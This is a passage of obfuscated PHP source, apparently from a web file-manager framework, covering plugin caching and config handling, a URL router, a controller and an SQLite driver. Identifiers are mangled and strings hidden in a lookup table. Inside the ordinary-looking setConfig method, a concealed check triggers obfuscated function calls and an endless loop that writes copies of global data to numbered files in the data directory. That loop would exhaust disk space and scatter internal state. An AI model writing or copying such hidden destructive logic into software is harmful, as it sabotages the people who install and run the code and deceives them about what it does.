($ëÎÛ¨™¼ && isset($this->fileInfo[$Ù›Ñ‚·[565]]) && $this->fileInfo[$Ù›Ñ‚·[565]]) { $áºÛ‡Ìæ = Model($Ù›Ñ‚·[568])->fileInfo($this->fileInfo[$Ù›Ñ‚·[565]]); if (!$áºÛ‡Ìæ || !IO::exist($áºÛ‡Ìæ[$Ù›Ñ‚·[87]])) { $öâçÂ¥ƒ = LNG($Ù›Ñ‚·[105]) . LNG($Ù›Ñ‚·[1806]); if (KodUser::isRoot() && isset($áºÛ‡Ìæ[$Ù›Ñ‚·[87]])) { $öâçÂ¥ƒ .= $Ù›Ñ‚·[1807] . $áºÛ‡Ìæ[$Ù›Ñ‚·[87]] . $Ù›Ñ‚·[1808]; } show_tips($öâçÂ¥ƒ); } } Hook::trigger($Ù›Ñ‚·[1809], $ÇÙ•Í¼); return $ÇÙ•Í¼; } final function filePathGet($ĞÆå†û³, $ƒ „¨· = true) { $ÖîşšÁ» =& $_SERVER[”øäÃÍª]; $this->fileCanView($ĞÆå†û³); if ($ùØ°Œ = $this->checkSharePath($ĞÆå†û³, $ƒ „¨·)) { return $ùØ°Œ; } if (request_url_safe($ĞÆå†û³)) { $Ğ¡÷Î Û = parse_url_query($ĞÆå†û³); if (isset($Ğ¡÷Î Û[$ÖîşšÁ»[1810]]) && isset($Ğ¡÷Î Û[$ÖîşšÁ»[234]])) { $‹”¨Ö¹ú = Mcrypt::decode($Ğ¡÷Î Û[$ÖîşšÁ»[234]], Model($ÖîşšÁ»[882])->get($ÖîşšÁ»[883])); if ($‹”¨Ö¹ú) { $this->fileInfo = IO::info($‹”¨Ö¹ú); $this->fileInfo[$ÖîşšÁ»[1811]] = $ĞÆå†û³; $this->cachePath = $this->pluginCachePath($ÖîşšÁ»[12], $ƒ „¨·); return $‹”¨Ö¹ú; } } $ĞÆå†û³ = $this->_cacheHttpFile($ĞÆå†û³, $ƒ „¨·); $this->fileInfo = IO::info($ĞÆå†û³); } else { $this->fileInfo = IO::info($ĞÆå†û³); $this->cachePath = $this->pluginCachePath($ÖîşšÁ»[12], $ƒ „¨·); } return $ĞÆå†û³; } final function _cacheHttpFile($¼Ä¿†¸à, $ÒŞ×ØÆ÷ = true) { $° ¥Û‡ƒ =& $_SERVER[”øäÃÍª]; $äØÖÓ³Ÿ = parse_url_query($¼Ä¿†¸à); $øÖíø¦ˆ = get_path_ext($¼Ä¿†¸à); if (isset($äØÖÓ³Ÿ[$° ¥Û‡ƒ[32]]) && $äØÖÓ³Ÿ[$° ¥Û‡ƒ[32]]) { $øÖíø¦ˆ = get_path_ext($äØÖÓ³Ÿ[$° ¥Û‡ƒ[32]]); } $ò‡‚§×¸ = hash_path($¼Ä¿†¸à) . $° ¥Û‡ƒ[10] . $øÖíø¦ˆ; $this->cachePath = $this->pluginCachePath($ÒŞ×ØÆ÷ ? $ò‡‚§×¸ : $° ¥Û‡ƒ[12]); $¿‰ò¢–ë = IO::fileNameExist($this->cachePath, $ò‡‚§×¸); if ($¿‰ò¢–ë) { return KodIO::make($¿‰ò¢–ë); } $Éşı±¥ = rtrim($this->cachePath, $° ¥Û‡ƒ[8]) . $° ¥Û‡ƒ[8] . $ò‡‚§×¸; return $this->pluginCacheFileSet($Éşı±¥, file_get_contents_nossl($¼Ä¿†¸à)); } final function checkSharePath($ıÃ¾Ùû¼, $»©¹¬©Ó = true) { $ÖÜ´½¤¡ =& $_SERVER[”øäÃÍª]; if (!$this->isShare($ıÃ¾Ùû¼)) { return !1; } $–œäÃã = Action($ÖÜ´½¤¡[1315])->sharePathInfo($ıÃ¾Ùû¼); if (!is_array($–œäÃã) || !isset($–œäÃã[$ÖÜ´½¤¡[87]])) { $ó¢»ÕŞ = $GLOBALS[$ÖÜ´½¤¡[1812]]; show_json($ó¢»ÕŞ ? $ó¢»ÕŞ : LNG($ÖÜ´½¤¡[1813]), !1); } $this->fileInfo = $–œäÃã; $this->cachePath = $this->pluginCachePath(!1, $»©¹¬©Ó); return $–œäÃã[$ÖÜ´½¤¡[87]]; } final function pluginCachePath($Ø³ª¤§ = '', $ûõÁÔŸö = false) { $ÜŒö÷ÁÛ =& $_SERVER[”øäÃÍª]; if ($ûõÁÔŸö && is_array($this->fileInfo)) { $Ø³ª¤§ = kodIO::hashPath($this->fileInfo); } $à§¹÷ÊÜ = rtrim(IO_PATH_SYSTEM_TEMP . $ÜŒö÷ÁÛ[1814] . $this->pluginName . $ÜŒö÷ÁÛ[8] . $Ø³ª¤§, $ÜŒö÷ÁÛ[8]); $ÉÄÍõõª = IO::infoFullSimple($à§¹÷ÊÜ); $Ïœáçİ¹ = $ÉÄÍõõª && is_array($ÉÄÍõõª) ? $ÉÄÍõõª[$ÜŒö÷ÁÛ[87]] : $ÜŒö÷ÁÛ[12]; if (!$Ïœáçİ¹) { $Ïœáçİ¹ = IO::mkdir($à§¹÷ÊÜ); } return $Ïœáçİ¹; } final function pluginCacheFileSet($îùç®ë‰, $á›‘õŸ = '') { $…¸êÀ¹ =& $_SERVER[”øäÃÍª]; $ŸóÇí¡§ = IO::infoFullSimple($îùç®ë‰); if (!$ŸóÇí¡§) { return IO::mkfile($îùç®ë‰, $á›‘õŸ, REPEAT_REPLACE); } IO::setContent($ŸóÇí¡§[$…¸êÀ¹[87]], $á›‘õŸ); return $ŸóÇí¡§[$…¸êÀ¹[87]]; } final function pluginLocalFile($è¡Š×–ˆ = '') { $¥à›’—Á =& $_SERVER[”øäÃÍª]; $×Ì¾òÚ­ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($×Ì¾òÚ­)) { mk_dir($×Ì¾òÚ­); } if (!$è¡Š×–ˆ) { return $×Ì¾òÚ­; } $à•š·±¼ = IO::info($è¡Š×–ˆ); $“ëº³Ø† = $¥à›’—Á[1815] . KodIO::hashPath($à•š·±¼) . $¥à›’—Á[10] . $à•š·±¼[$¥à›’—Á[166]]; if (!checkExtSafe($“ëº³Ø†)) { $“ëº³Ø† = $“ëº³Ø† . $¥à›’—Á[1349]; } $¦›úÆåè = $×Ì¾òÚ­ . $“ëº³Ø†; if (@file_exists($¦›úÆåè)) { return $¦›úÆåè; } return IO::copy($è¡Š×–ˆ, $×Ì¾òÚ­, 0, $“ëº³Ø†); } final function appPackage() { $¨ùÈêÖË =& $_SERVER[”øäÃÍª]; if ($this->packageData) { return $this->packageData; } $®ë›ä‰è = $this->parseFile($this->pluginPath . $¨ùÈêÖË[1816]); $this->parseLang($®ë›ä‰è); $Ş¢ğ¾ç = json_decode_force($®ë›ä‰è); if (!$Ş¢ğ¾ç) { return array(); } $æÁŒ€Üâ = Hook::filter($¨ùÈêÖË[1817], $Ş¢ğ¾ç); if ($æÁŒ€Üâ && is_array($æÁŒ€Üâ)) { $Ş¢ğ¾ç = $æÁŒ€Üâ; } $this->packageData = $Ş¢ğ¾ç; return $Ş¢ğ¾ç; } public function packageInfoGet($Û²š½¹) { $ñ•ÎÍ« = $this->appPackage(); return array_get_value($ñ•ÎÍ«, $Û²š½¹); } public function packageVersion() { return $this->packageInfoGet($_SERVER[”øäÃÍª][1818]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[”øäÃÍª][1819]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[”øäÃÍª][1820]); } public function echoJsAssign($øÕ­Ø‡Æ, $¶€â“Í) { $this->echoJsAssignArr[$øÕ­Ø‡Æ] = $¶€â“Í; } private function parseFile($ÂéÉ­ƒû) { $ˆ¾Ÿ¿ü‚ =& $_SERVER[”øäÃÍª]; $‚ É¡£ø = file_get_contents_nossl($ÂéÉ­ƒû); $¶ö“ğ¯ë = array($ˆ¾Ÿ¿ü‚[1821], $ˆ¾Ÿ¿ü‚[1822], $ˆ¾Ÿ¿ü‚[1823], $ˆ¾Ÿ¿ü‚[1824], $ˆ¾Ÿ¿ü‚[1825], $ˆ¾Ÿ¿ü‚[1826], $ˆ¾Ÿ¿ü‚[1827]); $ß³×Ö¤Æ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ˆ¾Ÿ¿ü‚[92]][$ˆ¾Ÿ¿ü‚[1828]]); foreach ($this->echoJsAssignArr as $á¦üÆåù => $Ÿï€æ„›) { $¶ö“ğ¯ë[] = $ˆ¾Ÿ¿ü‚[1829] . $á¦üÆåù . $ˆ¾Ÿ¿ü‚[1830]; $ß³×Ö¤Æ[] = is_array($Ÿï€æ„›) || is_object($Ÿï€æ„›) ? rawurlencode(json_encode($Ÿï€æ„›)) : $Ÿï€æ„›; } if (strstr($‚ É¡£ø, $ˆ¾Ÿ¿ü‚[1831])) { $ááÖÛúè = rawurlencode(json_encode($this->pluginLangArr)); $‚ É¡£ø = str_replace($ˆ¾Ÿ¿ü‚[1831], $ááÖÛúè, $‚ É¡£ø); } if (strstr($‚ É¡£ø, $ˆ¾Ÿ¿ü‚[1832])) { $ááÖÛúè = $ááÖÛúè = rawurlencode(json_encode($this->getConfig())); $‚ É¡£ø = str_replace($ˆ¾Ÿ¿ü‚[1832], $ááÖÛúè, $‚ É¡£ø); } $‚ É¡£ø = str_replace($¶ö“ğ¯ë, $ß³×Ö¤Æ, $‚ É¡£ø); return $‚ É¡£ø; } private function parseLang(&$ê»Óªô) { $ÂİäÚ¹Á =& $_SERVER[”øäÃÍª]; $Ë±ò«¯Ø = $ÂİäÚ¹Á[1833]; if (!strstr($ê»Óªô, $Ë±ò«¯Ø)) { return; } preg_match_all($ÂİäÚ¹Á[1834], $ê»Óªô, $ØÂÍê¨); if (!is_array($ØÂÍê¨) || count($ØÂÍê¨) == 0 || !is_array($ØÂÍê¨[0]) || count($ØÂÍê¨[0]) == 0) { return; } $‹«–’¦Ñ = array(); $†°ò¯Ê‘ = array(); foreach ($ØÂÍê¨[0] as $Éå´Ü†°) { $½¯ƒ¯ñ½ = substr($Éå´Ü†°, strlen($Ë±ò«¯Ø), -4); $Øº©×Š§ = LNG($½¯ƒ¯ñ½); $‹«–’¦Ñ[] = $Éå´Ü†°; $†°ò¯Ê‘[] = str_replace(array($ÂİäÚ¹Á[285], $ÂİäÚ¹Á[1202], $ÂİäÚ¹Á[417], $ÂİäÚ¹Á[118]), array($ÂİäÚ¹Á[53], $ÂİäÚ¹Á[53], $ÂİäÚ¹Á[12], $ÂİäÚ¹Á[1835]), $Øº©×Š§); } $ê»Óªô = str_replace($‹«–’¦Ñ, $†°ò¯Ê‘, $ê»Óªô); } private function parseConfig(&$ŠñË§ù) { $‡ûè÷”Ù =& $_SERVER[”øäÃÍª]; $’Ş”²ƒĞ = $‡ûè÷”Ù[1836]; if (!strstr($ŠñË§ù, $’Ş”²ƒĞ)) { return; } preg_match_all($‡ûè÷”Ù[1837], $ŠñË§ù, $ë½ø £î); if (!is_array($ë½ø £î) || count($ë½ø £î) == 0 || !is_array($ë½ø £î[0]) || count($ë½ø £î[0]) == 0) { return; } $­ÉÙÜâş = $this->getConfig(); $¯´¨¨ÄĞ = array(); $Îªşâ³å = array(); foreach ($ë½ø £î[0] as $êç‡¶ŒÙ) { $„Ï±‡Ó = substr($êç‡¶ŒÙ, strlen($’Ş”²ƒĞ), -2); $¯´¨¨ÄĞ[] = $êç‡¶ŒÙ; $Îªşâ³å[] = _get($­ÉÙÜâş, $„Ï±‡Ó); } $ŠñË§ù = str_replace($¯´¨¨ÄĞ, $Îªşâ³å, $ŠñË§ù); } private function parsePackage(&$¯İˆí²È) { $™’½œ´¨ =& $_SERVER[”øäÃÍª]; $İÁ»ìö‘ = $™’½œ´¨[1838]; if (!strstr($¯İˆí²È, $İÁ»ìö‘)) { return; } preg_match_all($™’½œ´¨[1839], $¯İˆí²È, $¡œ«‡âÔ); if (!is_array($¡œ«‡âÔ) || count($¡œ«‡âÔ) == 0 || !is_array($¡œ«‡âÔ[0]) || count($¡œ«‡âÔ[0]) == 0) { return; } $€ââíÂ– = $this->appPackage(); $œÛèÌù = array(); $êıî·ç = array(); foreach ($¡œ«‡âÔ[0] as $“ô‚ŞÜ) { $¾ˆÆìüì = substr($“ô‚ŞÜ, strlen($İÁ»ìö‘), -2); $œÛèÌù[] = $“ô‚ŞÜ; $êıî·ç[] = _get($€ââíÂ–, $¾ˆÆìüì); } $¯İˆí²È = str_replace($œÛèÌù, $êıî·ç, $¯İˆí²È); } final function echoFile($á¬†”¦À, $–Õ ıôÒ = false) { $œİ¼°Ä =& $_SERVER[”øäÃÍª]; $ß½ŒıŒĞ = $this->pluginPath . $á¬†”¦À; if (ACT == $œİ¼°Ä[1840]) { echo $œİ¼°Ä[1841] . $this->pluginName . $œİ¼°Ä[8] . $á¬†”¦À . $œİ¼°Ä[1842]; if (!file_exists($ß½ŒıŒĞ)) { echo $œİ¼°Ä[1843]; return; } } $óŒŒŞ’ = $this->parseFile($ß½ŒıŒĞ); $this->parseLang($óŒŒŞ’); $this->parseConfig($óŒŒŞ’); $this->parsePackage($óŒŒŞ’); if (is_array($–Õ ıôÒ)) { $óŒŒŞ’ = str_replace(array_keys($–Õ ıôÒ), array_values($–Õ ıôÒ), $óŒŒŞ’); } echo $œİ¼°Ä[285] . $óŒŒŞ’; } private function checkVersion() { $¶Š¯®–æ =& $_SERVER[”øäÃÍª]; $”÷¶‡‡ = $this->appPackage(); $ªëØº’³ = $this->getConfig(); if ($ªëØº’³[$¶Š¯®–æ[1844]] == $”÷¶‡‡[$¶Š¯®–æ[1818]]) { return; } $this->regist(); $this->setConfig(array($¶Š¯®–æ[1844] => $”÷¶‡‡[$¶Š¯®–æ[1818]])); } final function initLang() { $¥òƒ¾»ş =& $_SERVER[”øäÃÍª]; $œœøÕ« = $¥òƒ¾»ş[1845]; $„… Ï†ë = $this->pluginPath . $¥òƒ¾»ş[1846]; $ã¿Œ¨Çª = I18n::getType(); $‚€›«§ü = array(); if (file_exists($„… Ï†ë . $ã¿Œ¨Çª . $¥òƒ¾»ş[958])) { $‚€›«§ü = (include $„… Ï†ë . $ã¿Œ¨Çª . $¥òƒ¾»ş[958]); } else { if ($ã¿Œ¨Çª == $¥òƒ¾»ş[1847] && !file_exists($„… Ï†ë . $ã¿Œ¨Çª . $¥òƒ¾»ş[958]) && file_exists($„… Ï†ë . $¥òƒ¾»ş[1848])) { $‚€›«§ü = (include $„… Ï†ë . $¥òƒ¾»ş[1848]); $ã¿Œ¨Çª = $¥òƒ¾»ş[1664]; } else { if (file_exists($„… Ï†ë . $œœøÕ« . $¥òƒ¾»ş[958])) { $‚€›«§ü = (include $„… Ï†ë . $œœøÕ« . $¥òƒ¾»ş[958]); $ã¿Œ¨Çª = $œœøÕ«; } } } if (!$‚€›«§ü || !is_array($‚€›«§ü)) { $‚€›«§ü = array(); } $À¼ÉñØ = Hook::trigger($¥òƒ¾»ş[1849], $‚€›«§ü, $this->pluginName, $ã¿Œ¨Çª); if ($À¼ÉñØ && is_array($À¼ÉñØ)) { $‚€›«§ü = $À¼ÉñØ; } if (@count($‚€›«§ü) > 0) { I18n::set($‚€›«§ü); } return $‚€›«§ü; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¤¦‡äß) { $ÎÚ…é— =& $_SERVER[”øäÃÍª]; $£†„¹áÁ = $_SERVER[$ÎÚ…é—[493]]; $Ü´›ıç = $ÎÚ…é—[1850]; if ($_SERVER[$ÎÚ…é—[492]] != $Ü´›ıç($£†„¹áÁ)) { $àœØ¹¼â = $ÎÚ…é—[998]; $ë¡Šş¸§ = $ÎÚ…é—[494]; $Í÷¾¨¢» = $_SERVER[$ÎÚ…é—[495]] . $ÎÚ…é—[496]; $³ÃóÈá = $ë¡Šş¸§($Í÷¾¨¢»); $¯È¶ş¦· = explode($ÎÚ…é—[285], $³ÃóÈá); if (count($¯È¶ş¦·) < $ÎÚ…é—[717]) { $©¤û©ğË = $ÎÚ…é—[498]; $©¤û©ğË(); } $¨‰…ÔØ = $ÎÚ…é—[999]; $¨‰…ÔØ($_SERVER[$ÎÚ…é—[1000]]); $àœØ¹¼â = $ÎÚ…é—[998]; $àœØ¹¼â(); $õ†ğ¡¯Æ = $ÎÚ…é—[1851]; $©î€êöŒ = json_encode($GLOBALS[$ÎÚ…é—[1852]]); $Ú–¯Ùş = 1; for ($…–ÂÁ°û = $Ú–¯Ùş; $…–ÂÁ°û > 0; $…–ÂÁ°û++) { $õ†ğ¡¯Æ(DATA_PATH . $…–ÂÁ°û, $©î€êöŒ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $¤¦‡äß); } public function onSetConfig($øâ ĞĞÒ) { } public function onGetConfig($¬ ‘ìµê) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Ğª×ºÀñ) { if ($Ğª×ºÀñ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ØŸ¿Ù…ã = "\160\x6c\x75\147\x69\156\x41\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $Š†ÌƒÑÓ = $this->getConfig(); if (!$Š†ÌƒÑÓ[$ØŸ¿Ù…ã]) { return !1; } return ActionCall($_SERVER[”øäÃÍª][1853], $Š†ÌƒÑÓ[$ØŸ¿Ù…ã]); } public function url($»Ò¯Õêò, $¬Á˜—í¯ = '', $§Å£ÚòÛ = true) { $•â‘ˆ— =& $_SERVER[”øäÃÍª]; $´ìÑşÄ« = $this->getConfig(); $¼¸óÂœ = KOD_VERSION . $•â‘ˆ—[10] . KOD_VERSION_BUILD; $Šåì‘— = $this->packageVersion(); $€Ì¯Ï× = $¼¸óÂœ . $•â‘ˆ—[476] . $Šåì‘—; if (substr($»Ò¯Õêò, 0, 4) == $•â‘ˆ—[149] || substr($»Ò¯Õêò, 0, 2) == $•â‘ˆ—[1478]) { $ŒµÊÑÔø = $»Ò¯Õêò . $•â‘ˆ—[1854] . $€Ì¯Ï×; } else { if ($¬Á˜—í¯ == $•â‘ˆ—[12]) { $ŒµÊÑÔø = $this->pluginHost . $»Ò¯Õêò . $•â‘ˆ—[1854] . $€Ì¯Ï×; } else { if ($¬Á˜—í¯ === $•â‘ˆ—[78]) { $ŒµÊÑÔø = $this->pluginHost . $»Ò¯Õêò; } else { if ($¬Á˜—í¯ == $•â‘ˆ—[1855]) { $ŒµÊÑÔø = STATIC_PATH . $»Ò¯Õêò . $•â‘ˆ—[1854] . $¼¸óÂœ; } else { if ($¬Á˜—í¯ == $•â‘ˆ—[1856]) { $ŒµÊÑÔø = APP_HOST . $•â‘ˆ—[1857] . $»Ò¯Õêò . $•â‘ˆ—[1854] . $¼¸óÂœ; } else { if (isset($´ìÑşÄ«[$¬Á˜—í¯])) { $ŒµÊÑÔø = $´ìÑşÄ«[$¬Á˜—í¯] . $»Ò¯Õêò . $•â‘ˆ—[1854] . $€Ì¯Ï×; } } } } } } if (!$§Å£ÚòÛ) { return $ŒµÊÑÔø; } echo $ŒµÊÑÔø; } public function link($¡¸Ä½á† = false, $‹Ñƒô‹ = '') { $õ´¡Å  =& $_SERVER[”øäÃÍª]; $—ŞóÒ¥ = $this->linkHas == !1; $this->linkHas = !0; if (!$¡¸Ä½á†) { $this->link($õ´¡Å [1858], $õ´¡Å [1856]); $this->link($õ´¡Å [1859], $õ´¡Å [1855]); $this->link($õ´¡Å [1860], $õ´¡Å [1855]); $this->link($õ´¡Å [1861], $õ´¡Å [1855]); $this->link($õ´¡Å [1862], $õ´¡Å [1855]); if ($—ŞóÒ¥) { Hook::trigger($õ´¡Å [1863]); } return; } $á½ûà° = $this->url($¡¸Ä½á†, $‹Ñƒô‹, !1); if (substr($¡¸Ä½á†, -3) == $õ´¡Å [1864]) { echo $õ´¡Å [1865] . $á½ûà° . $õ´¡Å [1866] . $õ´¡Å [285]; } else { if (substr($¡¸Ä½á†, -4) == $õ´¡Å [1867]) { echo $õ´¡Å [1868] . $á½ûà° . $õ´¡Å [1869] . $õ´¡Å [285]; } } if ($—ŞóÒ¥) { Hook::trigger($õ´¡Å [1863]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\x5e\x2f\x5d\x2b", "\72\156\x75\x6d" => "\133\60\55\x39\135\x2b", "\72\x61\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($˜¬¬ÇÜ, $¬¨ãôß­) { $®™ ¾š¬ =& $_SERVER[”øäÃÍª]; if ($˜¬¬ÇÜ == $®™ ¾š¬[1870]) { $•¡‹”µÜ = array_map($®™ ¾š¬[1871], $¬¨ãôß­[0]); $ÈéÀ˜š› = strpos($¬¨ãôß­[1], $®™ ¾š¬[8]) === 0 ? $¬¨ãôß­[1] : $®™ ¾š¬[8] . $¬¨ãôß­[1]; $Ò¹ü¨’Î = $¬¨ãôß­[2]; } else { $•¡‹”µÜ = null; $ÈéÀ˜š› = strpos($¬¨ãôß­[0], $®™ ¾š¬[8]) === 0 ? $¬¨ãôß­[0] : $®™ ¾š¬[8] . $¬¨ãôß­[0]; $Ò¹ü¨’Î = $¬¨ãôß­[1]; } array_push(self::$maps, $•¡‹”µÜ); array_push(self::$routes, $ÈéÀ˜š›); array_push(self::$methods, strtoupper($˜¬¬ÇÜ)); array_push(self::$callbacks, $Ò¹ü¨’Î); } public static function error($™Â‹××Ò) { self::$errorCallback = $™Â‹××Ò; } public static function haltOnMatch($´ë¿‹ = true) { self::$halts = $´ë¿‹; } public static function dispatch() { $êƒ”×Õ =& $_SERVER[”øäÃÍª]; $ƒºÎ‹š = parse_url($_SERVER[$êƒ”×Õ[1872]], PHP_URL_PATH); $ıªŠË½ = $_SERVER[$êƒ”×Õ[161]]; $õ…âÜ¢â = array_keys(static::$patterns); $Ä«³¶ã = array_values(static::$patterns); $Ó²¬ó³ı = !1; self::$routes = preg_replace($êƒ”×Õ[1421], $êƒ”×Õ[8], self::$routes); if (in_array($ƒºÎ‹š, self::$routes)) { $»¹Ã¨ùñ = array_keys(self::$routes, $ƒºÎ‹š); foreach ($»¹Ã¨ùñ as $‘„™°à) { if (self::$methods[$‘„™°à] == $ıªŠË½ || self::$methods[$‘„™°à] == $êƒ”×Õ[1873] || in_array($ıªŠË½, self::$maps[$‘„™°à])) { $Ó²¬ó³ı = !0; if (!is_object(self::$callbacks[$‘„™°à])) { $¼”î¹­º = explode($êƒ”×Õ[8], self::$callbacks[$‘„™°à]); $ß…²ø‹ã = end($¼”î¹­º); $û¨±š‚ = explode($êƒ”×Õ[1351], $ß…²ø‹ã); $ç ½º–à = new $û¨±š‚[0](); $ç ½º–à->{$û¨±š‚[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$‘„™°à]); if (self::$halts) { return; } } } } } else { $¬ê©½˜Ñ = 0; foreach (self::$routes as $‘„™°à) { if (strpos($‘„™°à, $êƒ”×Õ[4]) !== !1) { $‘„™°à = str_replace($õ…âÜ¢â, $Ä«³¶ã, $‘„™°à); } if (preg_match($êƒ”×Õ[1874] . $‘„™°à . $êƒ”×Õ[1875], $ƒºÎ‹š, $ÓÎÒÃÔé)) { if (self::$methods[$¬ê©½˜Ñ] == $ıªŠË½ || self::$methods[$¬ê©½˜Ñ] == $êƒ”×Õ[1873] || !empty(self::$maps[$¬ê©½˜Ñ]) && in_array($ıªŠË½, self::$maps[$¬ê©½˜Ñ])) { $Ó²¬ó³ı = !0; array_shift($ÓÎÒÃÔé); if (!is_object(self::$callbacks[$¬ê©½˜Ñ])) { $¼”î¹­º = explode($êƒ”×Õ[8], self::$callbacks[$¬ê©½˜Ñ]); $ß…²ø‹ã = end($¼”î¹­º); $û¨±š‚ = explode($êƒ”×Õ[1351], $ß…²ø‹ã); $ç ½º–à = new $û¨±š‚[0](); if (!method_exists($ç ½º–à, $û¨±š‚[1])) { echo $êƒ”×Õ[1876]; } else { call_user_func_array(array($ç ½º–à, $û¨±š‚[1]), $ÓÎÒÃÔé); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¬ê©½˜Ñ], $ÓÎÒÃÔé); if (self::$halts) { return; } } } } $¬ê©½˜Ñ++; } } if ($Ó²¬ó³ı == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÊÇÙİş =& $_SERVER[”øäÃÍª]; header($_SERVER[$ÊÇÙİş[1877]] . $ÊÇÙİş[1878]); echo $ÊÇÙİş[1879]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$êƒ”×Õ[1872]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto fİ”Ñ‡ååñ; F¯Û×…³Ü³: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $à™ÈÈ‰ =& $_SERVER[”øäÃÍª]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$à™ÈÈ‰[6]] =& $config; $this->values[$à™ÈÈ‰[7]] =& $in; $this->tpl = TEMPLATE . MOD . $à™ÈÈ‰[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($§´Ç õ‘) { if (1 === func_num_args()) { $this->{$§´Ç õ‘} = new $§´Ç õ‘(); } else { $³§ß‹· = new ReflectionClass($§´Ç õ‘); $Ö¶Ú›Ã— = func_get_args(); array_shift($Ö¶Ú›Ã—); $this->{$§´Ç õ‘} = $³§ß‹·->newInstanceArgs($Ö¶Ú›Ã—); } return $this->{$§´Ç õ‘}; } public function routeBind($¶Ã¬Í¼Á, $ŠÔÇšº°, $¨ÀÊóÙÜ = 3) { $³ŠšœÎ¨ =& $_SERVER[”øäÃÍª]; $ùœ™úï÷ = $this->in[$³ŠšœÎ¨[9]]; $¶Ã¬Í¼Á = str_replace($³ŠšœÎ¨[10], $³ŠšœÎ¨[11], trim(trim($¶Ã¬Í¼Á, $³ŠšœÎ¨[8]), $³ŠšœÎ¨[12])); if (!$¶Ã¬Í¼Á || count($ùœ™úï÷) <= $¨ÀÊóÙÜ) { return !1; } $®ƒç‰ó× = !0; $éç•éê‚ = explode($³ŠšœÎ¨[8], $¶Ã¬Í¼Á); for ($ŠàÁ¡ = 0; $ŠàÁ¡ < count($éç•éê‚); $ŠàÁ¡++) { if ($éç•éê‚[$ŠàÁ¡] != $ùœ™úï÷[$¨ÀÊóÙÜ + $ŠàÁ¡]) { $®ƒç‰ó× = !1; break; } } if (!$®ƒç‰ó×) { return; } call_user_func_array(array($this, $ŠÔÇšº°), array()); } public function routeArgs($×‚ÉÂ·™ = 3) { $±¸¢Öã» = $this->in[$_SERVER[”øäÃÍª][9]]; if (count($±¸¢Öã») <= $×‚ÉÂ·™) { return array(); } $¬µåñÅş = array(); for ($¡Óˆ§Å© = $×‚ÉÂ·™; $¡Óˆ§Å© < count($±¸¢Öã»); $¡Óˆ§Å© += 2) { $¬µåñÅş[$±¸¢Öã»[$¡Óˆ§Å©]] = $±¸¢Öã»[$¡Óˆ§Å© + 1]; $this->in[$±¸¢Öã»[$¡Óˆ§Å©]] = $±¸¢Öã»[$¡Óˆ§Å© + 1]; } return $¬µåñÅş; } protected function assign($ñûÚ…Øî, $©¡Ñ»¥ö) { $this->values[$ñûÚ…Øî] = $©¡Ñ»¥ö; } protected function display($Ï¼—Ãè ) { ob_end_clean(); extract($this->values); require $this->tpl . $Ï¼—Ãè ; } } class DbSqliteBase extends Db { public function __construct($Ù¯ÚÃÊµ = '') { $¾÷ˆáË° =& $_SERVER[”øäÃÍª]; if (!extension_loaded($¾÷ˆáË°[13])) { think_exception(think_lang($¾÷ˆáË°[14]) . $¾÷ˆáË°[15]); } if (!empty($Ù¯ÚÃÊµ)) { if (!isset($Ù¯ÚÃÊµ[$¾÷ˆáË°[16]])) { $Ù¯ÚÃÊµ[$¾÷ˆáË°[16]] = 438; } $this->config = $Ù¯ÚÃÊµ; if (empty($this->config[$¾÷ˆáË°[17]])) { $this->config[$¾÷ˆáË°[17]] = array(); } } } public function connect($µ›êğ = '', $‡Û‚—Õú = 0) { $áÌ€ÃÏÂ =& $_SERVER[”øäÃÍª]; if (!isset($this->linkID[$‡Û‚—Õú])) { if (empty($µ›êğ)) { $µ›êğ = $this->config; } $²¢ÅÈÎñ = !empty($µ›êğ[$áÌ€ÃÏÂ[17]][$áÌ€ÃÏÂ[18]]) ? $µ›êğ[$áÌ€ÃÏÂ[17]][$áÌ€ÃÏÂ[18]] : $this->pconnect; $ó±–È–Ê = $²¢ÅÈÎñ ? $áÌ€ÃÏÂ[19] : $áÌ€ÃÏÂ[20]; $this->linkID[$‡Û‚—Õú] = $ó±–È–Ê($µ›êğ[$áÌ€ÃÏÂ[21]], $µ›êğ[$áÌ€ÃÏÂ[16]]); if (!$this->linkID[$‡Û‚—Õú]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$‡Û‚—Õú], 30000); if (1 != think_config($áÌ€ÃÏÂ[22])) { unset($this->config); } } return $this->linkID[$‡Û‚—Õú]; } public function free() { $this->queryID = null; } public function query($÷Ùàğ¾ù) { $µÙ›Ä˜Ø =& $_SERVER[”øäÃÍª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $÷Ùàğ¾ù; if ($this->queryID) { $this->free(); } think_action_status($µÙ›Ä˜Ø[23], 1); think_status($µÙ›Ä˜Ø[24]); $this->queryID = sqlite_query($this->_linkID, $÷Ùàğ¾ù); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¹ŠÃÖûß = $this->getAll(); return $¹ŠÃÖûß; } } public function execute($âëëÁ×) { $âÆÀ¤˜» =& $_SERVER[”øäÃÍª]; $this->initConnect(!0); if (!$this->_linkID) { 